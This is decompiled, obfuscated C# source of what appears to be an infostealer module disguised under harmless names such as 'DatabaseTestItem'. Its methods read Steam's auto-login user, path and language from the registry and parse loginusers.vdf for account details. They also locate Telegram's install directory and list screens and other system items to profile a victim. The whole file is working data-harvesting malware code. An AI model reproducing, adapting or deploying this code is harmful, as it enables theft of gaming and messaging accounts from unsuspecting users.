using GDBD.Importers;
using GDBD.Workers;
using Microsoft.Win32;
using Newtonsoft.Common;
using Newtonsoft.Expressions;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace GDBD.Items
{
	internal sealed class DatabaseTestItem
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string AwakeEvent()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			AccountInstanceExpression accountInstanceExpression = new AccountInstanceExpression(WrapperIssuerImporter.serializerEvent);
			string text = "";
			if (accountInstanceExpression.Count > 0)
			{
				foreach (ExceptionEvent item in accountInstanceExpression)
				{
					text = text + item.Name + "\r\n";
				}
			}
			return text;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string UpdateEvent()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			string text = "";
			Screen[] allScreens = Screen.AllScreens;
			foreach (Screen screen in allScreens)
			{
				text = text + screen.DeviceName + "\r\n";
			}
			return text;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string ReadEvent()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			string text = "";
			for (int i = 0; i < DecoratorList._0001(); i++)
			{
				text = text + DecoratorList.PushDic(i)._0001() + "\r\n";
			}
			return text;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string InterruptEvent()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			try
			{
				Match match = new Regex("(\\w\\W.+)Telegram.exe").Match((string)Registry.GetValue("HKEY_CLASSES_ROOT\\tdesktop.tg\\shell\\open\\command", null, null));
				return match.Value.Replace("Telegram.exe", "");
			}
			catch
			{
				return "Unknown";
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string CalcEvent()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Valve\\Steam");
				string result = (string)registryKey.GetValue("AutoLoginUser");
				registryKey.Close();
				return result;
			}
			catch
			{
				return "Unknown";
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string InstantiateEvent()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			try
			{
				string text = File.ReadAllText(ResetEvent() + "/config/loginusers.vdf");
				int num = text.IndexOf(CalcEvent());
				if (num >= 0)
				{
					text = text.Substring(0, num);
				}
				string text2 = text.Substring(0, text.Length - 23);
				return text2.Remove(0, text2.LastIndexOf('"') + 1).Trim();
			}
			catch
			{
				return "Unknown";
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string ReflectEvent()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Valve\\Steam");
				string result = (string)registryKey.GetValue("Language");
				registryKey.Close();
				return result;
			}
			catch
			{
				return "Unknown";
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string ResetEvent()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Valve\\Steam");
				string result = (string)registryKey.GetValue("SteamPath");
				registryKey.Close();
				return result;
			}
			catch
			{
				return "Unknown";
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public DatabaseTestItem()
		{
			//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
			//IL_0003: Incompatible stack heights: 0 vs 1
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			SingletonReader.PushGlobal();
			base._002Ector();
		}
	}
}
